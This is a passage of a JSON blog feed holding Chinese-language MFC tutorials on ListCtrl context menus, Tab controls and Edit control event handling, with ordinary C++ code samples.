class=\"token operator\">*</span> pNMHDR<span class=\"token punctuation\">,</span> LRESULT<span class=\"token operator\">*</span> pResult<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\tLPNMITEMACTIVATE pNMItemActivate <span class=\"token operator\">=</span> <span class=\"token keyword\">reinterpret_cast</span><span class=\"token operator\">&lt;</span>LPNMITEMACTIVATE<span class=\"token operator\">></span><span class=\"token punctuation\">(</span>pNMHDR<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token comment\">// TODO: 在此添加控件通知处理程序代码</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\tNM_LISTVIEW<span class=\"token operator\">*</span> pNMListView <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>NM_LISTVIEW<span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>pNMHDR<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>pNMListView<span class=\"token operator\">-></span>iItem <span class=\"token operator\">!=</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t\tDWORD dwPos <span class=\"token operator\">=</span> <span class=\"token function\">GetMessagePos</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t\tCPoint <span class=\"token function\">point</span><span class=\"token punctuation\">(</span><span class=\"token function\">LOWORD</span><span class=\"token punctuation\">(</span>dwPos<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token function\">HIWORD</span><span class=\"token punctuation\">(</span>dwPos<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t\tCMenu menu<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t\t<span class=\"token function\">VERIFY</span><span class=\"token punctuation\">(</span>menu<span class=\"token punctuation\">.</span><span class=\"token function\">LoadMenu</span><span class=\"token punctuation\">(</span>IDR_MENU1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t\tCMenu<span class=\"token operator\">*</span> popup <span class=\"token operator\">=</span> menu<span class=\"token punctuation\">.</span><span class=\"token function\">GetSubMenu</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t\t<span class=\"token function\">ASSERT</span><span class=\"token punctuation\">(</span>popup <span class=\"token operator\">!=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t\tpopup<span class=\"token operator\">-></span><span class=\"token function\">TrackPopupMenu</span><span class=\"token punctuation\">(</span>TPM_LEFTALIGN <span class=\"token operator\">|</span> TPM_RIGHTBUTTON<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t\t\tpoint<span class=\"token punctuation\">.</span>x<span class=\"token punctuation\">,</span> point<span class=\"token punctuation\">.</span>y<span class=\"token punctuation\">,</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t<span class=\"token operator\">*</span>pResult <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><img data-src=\"image013.png\" alt=\"\" /></p>\n<h3 id=\"添加右键响应函数\"><a class=\"anchor\" href=\"#添加右键响应函数\">#</a> 添加右键响应函数</h3>\n<p>为菜单添加消息事件处理函数：</p>\n<p><img data-src=\"image014.png\" alt=\"\" /></p>\n<p><img data-src=\"image015.png\" alt=\"\" /></p>\n<p><img data-src=\"image016.png\" alt=\"\" /></p>\n<h1 id=\"结尾\"><a class=\"anchor\" href=\"#结尾\">#</a> 结尾</h1>\n<p>ListControl 还有很多功能，等用到了再学了。</p>\n<h1 id=\"reference\"><a class=\"anchor\" href=\"#reference\">#</a> Reference</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xzaF8yMDEzL2FydGljbGUvZGV0YWlscy80NDYyNDIzOQ==\">https://blog.csdn.net/lsh_2013/article/details/44624239</span><br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNDk4MjYxL2FydGljbGUvZGV0YWlscy8xMDg3MTkyMjg=\">https://blog.csdn.net/qq_41498261/article/details/108719228</span></p>\n",
            "tags": [
                "ListCtrl"
            ]
        },
        {
            "id": "https://or0kit.github.io/Programming/MFC/MFC-05Tab%E6%A0%87%E7%AD%BE%E6%8E%A7%E4%BB%B6/",
            "url": "https://or0kit.github.io/Programming/MFC/MFC-05Tab%E6%A0%87%E7%AD%BE%E6%8E%A7%E4%BB%B6/",
            "title": "MFC-05Tab标签控件",
            "date_published": "2022-03-22T06:43:28.000Z",
            "content_html": "<h1 id=\"tab标签控件\"><a class=\"anchor\" href=\"#tab标签控件\">#</a> Tab 标签控件</h1>\n<p>添加 Tab Control 控件</p>\n<p><img data-src=\"image001.png\" alt=\"\" /></p>\n<p>我们为了使用方便先给这个标签页添加一个类型变量  <code>m_Tab1</code>  。</p>\n<p><img data-src=\"image002.png\" alt=\"\" /></p>\n<p>在工程中添加子对话框，有几个标签页插入几个子对话框，并且修改对话框资源属性，把 边框改为  <code>None</code>  把样式改为  <code>Child</code>  英文是  <code>Border：None</code>   <code>Style：Child</code> 。</p>\n<p><img data-src=\"image003.png\" alt=\"\" /></p>\n<p>然后对着子对话框右键选择添加类，这里类名随便起，基类就选择  <code>CDialog</code>  了。</p>\n<p><img data-src=\"image004.png\" alt=\"\" /></p>\n<p>在主对话框类声明中加入子对话框的实例化对象：  <code>CPage1 m_CPage1</code>  ， 记得包含进我们为子对话框新建的类的声明文件。</p>\n<p>以上步骤我们重复一次再创建一个  <code>CPage2 m_CPage2</code> 。</p>\n<p>现在我们开始显示这两个标签页。</p>\n<p>在主对话框初始化的地方添加如下代码:</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 添加标签页</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\tm_Tab1<span class=\"token punctuation\">.</span><span class=\"token function\">InsertItem</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token function\">_T</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"第一页\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\tm_Tab1<span class=\"token punctuation\">.</span><span class=\"token function\">InsertItem</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token function\">_T</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"第二页\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\tm_CPage1<span class=\"token punctuation\">.</span><span class=\"token function\">Create</span><span class=\"token punctuation\">(</span>IDD_DIALOG1<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>m_Tab1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\tm_CPage2<span class=\"token punctuation\">.</span><span class=\"token function\">Create</span><span class=\"token punctuation\">(</span>IDD_DIALOG2<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>m_Tab1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t<span class=\"token comment\">// 调整子对话框大小及位置</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\tCRect rc<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\tm_Tab1<span class=\"token punctuation\">.</span><span class=\"token function\">GetClientRect</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>rc<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\tCRect rcTabItem<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\tm_Tab1<span class=\"token punctuation\">.</span><span class=\"token function\">GetItemRect</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> rcTabItem<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\trc<span class=\"token punctuation\">.</span>top <span class=\"token operator\">+=</span> rcTabItem<span class=\"token punctuation\">.</span><span class=\"token function\">Height</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">4</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\trc<span class=\"token punctuation\">.</span>left <span class=\"token operator\">+=</span> <span class=\"token number\">4</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\trc<span class=\"token punctuation\">.</span>bottom <span class=\"token operator\">-=</span> <span class=\"token number\">4</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\trc<span class=\"token punctuation\">.</span>right <span class=\"token operator\">-=</span> <span class=\"token number\">4</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\tm_CPage1<span class=\"token punctuation\">.</span><span class=\"token function\">MoveWindow</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>rc<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\tm_CPage2<span class=\"token punctuation\">.</span><span class=\"token function\">MoveWindow</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>rc<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\t<span class=\"token comment\">// 设置默认的标签页</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\tm_CPage1<span class=\"token punctuation\">.</span><span class=\"token function\">ShowWindow</span><span class=\"token punctuation\">(</span>SW_SHOW<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\tm_Tab1<span class=\"token punctuation\">.</span><span class=\"token function\">SetCurFocus</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>当然这个过程也可以封装一下方便以后自己调用。</p>\n<p>然后给标签页控件添加 消息处理函数</p>\n<p><img data-src=\"image005.png\" alt=\"\" /></p>\n<p>函数为:</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token class-name\">CMFCCStringDlg</span><span class=\"token operator\">::</span><span class=\"token function\">OnTcnSelchangeTab1</span><span class=\"token punctuation\">(</span>NMHDR<span class=\"token operator\">*</span> pNMHDR<span class=\"token punctuation\">,</span> LRESULT<span class=\"token operator\">*</span> pResult<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token comment\">// TODO: 在此添加控件通知处理程序代码</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token keyword\">switch</span> <span class=\"token punctuation\">(</span>m_Tab1<span class=\"token punctuation\">.</span><span class=\"token function\">GetCurSel</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token keyword\">case</span> <span class=\"token number\">0</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t\tm_CPage1<span class=\"token punctuation\">.</span><span class=\"token function\">ShowWindow</span><span class=\"token punctuation\">(</span>SW_SHOW<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t\tm_CPage2<span class=\"token punctuation\">.</span><span class=\"token function\">ShowWindow</span><span class=\"token punctuation\">(</span>SW_HIDE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t\tm_CPage1<span class=\"token punctuation\">.</span><span class=\"token function\">SetFocus</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t<span class=\"token keyword\">case</span> <span class=\"token number\">1</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t\tm_CPage2<span class=\"token punctuation\">.</span><span class=\"token function\">ShowWindow</span><span class=\"token punctuation\">(</span>SW_SHOW<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t\tm_CPage1<span class=\"token punctuation\">.</span><span class=\"token function\">ShowWindow</span><span class=\"token punctuation\">(</span>SW_HIDE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t\tm_CPage2<span class=\"token punctuation\">.</span><span class=\"token function\">SetFocus</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t<span class=\"token keyword\">default</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t<span class=\"token operator\">*</span>pResult <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>当显示第 X 页的时候，要把其他页给隐藏了。</p>\n<p><img data-src=\"image006.png\" alt=\"\" /></p>\n<p>当然也可以进行美化。</p>\n",
            "tags": [
                "Tab"
            ]
        },
        {
            "id": "https://or0kit.github.io/Programming/MFC/MFC-04ComboBox%E6%8E%A7%E4%BB%B6/",
            "url": "https://or0kit.github.io/Programming/MFC/MFC-04ComboBox%E6%8E%A7%E4%BB%B6/",
            "title": "MFC-04ComboBox控件",
            "date_published": "2022-03-20T09:07:32.000Z",
            "content_html": "<h1 id=\"\"><a class=\"anchor\" href=\"#\">#</a> </h1>\n",
            "tags": [
                "Combo Box"
            ]
        },
        {
            "id": "https://or0kit.github.io/Programming/MFC/MFC-03Edit%E7%BC%96%E8%BE%91%E6%A1%86%E6%8E%A7%E4%BB%B6/",
            "url": "https://or0kit.github.io/Programming/MFC/MFC-03Edit%E7%BC%96%E8%BE%91%E6%A1%86%E6%8E%A7%E4%BB%B6/",
            "title": "MFC-03Edit编辑框控件",
            "date_published": "2022-03-20T09:05:37.000Z",
            "content_html": "<h1 id=\"edit控件\"><a class=\"anchor\" href=\"#edit控件\">#</a> Edit 控件</h1>\n<h2 id=\"设置编辑框控件内的文本内容\"><a class=\"anchor\" href=\"#设置编辑框控件内的文本内容\">#</a> 设置编辑框控件内的文本内容</h2>\n<p>这些方法哪一个都可以：</p>\n<p><img data-src=\"image001.png\" alt=\"\" /></p>\n<h2 id=\"获取编辑框控件内的文本内容\"><a class=\"anchor\" href=\"#获取编辑框控件内的文本内容\">#</a> 获取编辑框控件内的文本内容</h2>\n<p>这些方法都可以：</p>\n<p><img data-src=\"image002.png\" alt=\"\" /></p>\n<h2 id=\"编辑框控件的属性介绍\"><a class=\"anchor\" href=\"#编辑框控件的属性介绍\">#</a> 编辑框控件的属性介绍</h2>\n<p>a、让编辑框文本为只读模式；<br />\nb、让编辑框文本为密码模式；<br />\nd、让编辑框支持多行显示，即：自动换行；<br />\ne、让编辑框显示滚动条；<br />\nf、让编辑框只能接受数字输入；<br />\ng、让编辑框只能输入指定范围的数组；</p>\n<p>以上这些属性都可以在编辑框的属性中设置。</p>\n<p>但如果还有其他方面的限制要求，那只能是利用接下来要讲解的事件通知的方式来处理了。</p>\n<h2 id=\"事件通知\"><a class=\"anchor\" href=\"#事件通知\">#</a> 事件通知</h2>\n<p>先认识两个消息事件。</p>\n<p><code>EN_CHANGE</code>  : 当编辑框中的文本被修改，新的文本显示之 “后” 发送此消息<br />\n <code>EN_UPDATE</code>  : 当编辑框中的文本被修改，新的文本显示之 “前” 发送此消息</p>\n<p>当编辑框内的文本内容发生变化时通知我，响应  <code>EN_CHANGE</code>  事件；</p>\n<p>添加事件处理程序：</p>\n<p><img data-src=\"image003.png\" alt=\"\" /></p>\n<p>这是一个非常常用是消息事件，下面我们利用它来实现一些功能。</p>\n<p><img data-src=\"image004.png\" alt=\"\" /></p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 使文本框中只能写入 ABC </span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>BOOL flag <span class=\"token operator\">=</span> FALSE<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>CString str<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>m_Edit2<span class=\"token punctuation\">.</span><span class=\"token function\">GetWindowText</span><span class=\"token punctuation\">(</span>str<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>size_t i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> str<span class=\"token punctuation\">.</span><span class=\"token function\">GetLength</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token punctuation\">(</span>str<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">!=</span> <span class=\"token string\">'A'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token operator\">&amp;&amp;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token punctuation\">(</span>str<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">!=</span> <span class=\"token string\">'B'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token operator\">&amp;&amp;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token punctuation\">(</span>str<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">!=</span> <span class=\"token string\">'C'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token comment\">// 不等于的话就把文字给替换了</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    flag <span class=\"token operator\">=</span> TRUE<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    str<span class=\"token punctuation\">.</span><span class=\"token function\">SetAt</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span> <span class=\"token string\">'#'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>  str<span class=\"token punctuation\">.</span><span class=\"token function\">Replace</span><span class=\"token punctuation\">(</span><span class=\"token function\">_T</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"#\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token function\">_T</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>  m_Edit2<span class=\"token punctuation\">.</span><span class=\"token function\">SetWindowText</span><span class=\"token punctuation\">(</span>str<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>因为  <code>SetWindowText</code>  函数会触发  <code>EN_CHANGE</code>  消息，所以要加一个判断的标志，判断是否需要替换。</p>\n<h2 id=\"编辑框控件的长度限制\"><a class=\"anchor\" href=\"#编辑框控件的长度限制\">#</a> 编辑框控件的长度限制</h2>\n<p>默认情况下编辑框控件的文本长度有限制，可以调用这个函数获取一下：</p>\n<p><code>UINT nLimitLen = m_Edit.GetLimitText();</code></p>\n<p>看到多少了吧？要解除这个限制呢，或者改成更大一些？</p>\n<p><code>m_Edit.SetLimitText(0);</code></p>\n<h2 id=\"向编辑框的结尾增加数据\"><a class=\"anchor\" href=\"#向编辑框的结尾增加数据\">#</a> 向编辑框的结尾增加数据</h2>\n<p>现在点击添加文本就会添加到已有文本的后面了。</p>\n<p><img data-src=\"image007.png\" alt=\"\" /></p>\n<h2 id=\"始终显示最新的数据光标定位到文本结尾\"><a class=\"anchor\" href=\"#始终显示最新的数据光标定位到文本结尾\">#</a> 始终显示最新的数据（光标定位到文本结尾）</h2>\n<p>我们发现向文本框中写入文本时光标一直在最前方，不合逻辑。</p>\n<p>我们可以在每次输入完信息后，让光标定位到结尾。</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>m_Edit2<span class=\"token punctuation\">.</span><span class=\"token function\">SetFocus</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>m_Edit2<span class=\"token punctuation\">.</span><span class=\"token function\">SetSel</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>在  <code>EN_CHANGE</code>  消息处理函数最后加入以上两行代码就行了。</p>\n<h1 id=\"使用编辑框打开文件资源管理器\"><a class=\"anchor\" href=\"#使用编辑框打开文件资源管理器\">#</a> 使用编辑框打开文件资源管理器</h1>\n<p>这个涉及了  <code>CFileDialog</code>  类。</p>\n<pre><code class=\"language-cpp\">\n</code></pre>\n<h1 id=\"设置默认内容点击输入时默认内容消失\"><a class=\"anchor\" href=\"#设置默认内容点击输入时默认内容消失\">#</a> 设置默认内容点击输入时默认内容消失</h1>\n<ol>\n<li>添加 <code>EN_SETFOCUS</code>  事件：</li>\n</ol>\n<p><img data-src=\"image008.png\" alt=\"\" /></p>\n<ol start=\"2\">\n<li>在 <code>OnInitDialog()</code>  中添加代码：</li>\n</ol>\n<p><img data-src=\"image009.png\" alt=\"\" /></p>\n<p>不知道为什么焦点首先聚集在编辑框中，于是我就手动设置了一下焦点，使其默认在一个按钮上了。</p>\n<ol start=\"3\">\n<li>设置 <code>EN_SETFOCUS</code>  事件响应函数：</li>\n</ol>\n<p><img data-src=\"image010.png\" alt=\"\" /></p>\n<p>效果：</p>\n<p>点击编辑框之前：</p>\n<p><img data-src=\"image011.png\" alt=\"\" /></p>\n<p>点击编辑框之后：</p>\n<p><img data-src=\"image012.png\" alt=\"\" /></p>\n<h1 id=\"拖拽文件使其在编辑框中显示文件路径\"><a class=\"anchor\" href=\"#拖拽文件使其在编辑框中显示文件路径\">#</a> 拖拽文件使其在编辑框中显示文件路径</h1>\n<ol>\n<li>\n<p>更改主窗口的属性：接受文件改为 TRUE</p>\n</li>\n<li>\n<p>对主窗口右键选择类向导，添加消息 <code>WM_DROPFILES</code>  的处理函数。</p>\n</li>\n</ol>\n<p>示例：</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token class-name\">CR3FileIrpContstructorDlg</span><span class=\"token operator\">::</span><span class=\"token function\">OnDropFiles</span><span class=\"token punctuation\">(</span>HDROP hDropInfo<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token comment\">// TODO: 在此添加消息处理程序代码和 / 或调用默认值</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token comment\">// </span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token comment\">// 获得拖曳文件的文件名</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\tTCHAR szFilePath<span class=\"token punctuation\">[</span>MAX_PATH<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t<span class=\"token function\">DragQueryFile</span><span class=\"token punctuation\">(</span>hDropInfo<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> szFilePath<span class=\"token punctuation\">,</span> MAX_PATH<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token comment\">// 在编辑框中设置文件路径</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\tm_Edit_FilePath<span class=\"token punctuation\">.</span><span class=\"token function\">SetWindowTextW</span><span class=\"token punctuation\">(</span>szFilePath<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t<span class=\"token comment\">// 拖放结束后，释放内存</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t<span class=\"token function\">DragFinish</span><span class=\"token punctuation\">(</span>hDropInfo<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t<span class=\"token comment\">// CDialog::OnDropFiles(hDropInfo);</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure>",
            "tags": [
                "Edit"
            ]
        },
        {
            "id": "https://or0kit.github.io/Programming/MFC/MFC-02%E5%8D%95%E9%80%89%E6%A1%86%E4%B8%8E%E5%A4%8D%E9%80%89%E6%A1%86%E4%BB%B6/",
            "url": "https://or0kit.github.io/Programming/MFC/MFC-02%E5%8D%95%E9%80%89%E6%A1%86%E4%B8%8E%E5%A4%8D%E9%80%89%E6%A1%86%E4%BB%B6/",
            "title": "MFC-02单选框与复选框件",
            "date_published": "2022-03-19T08:08:56.000Z",
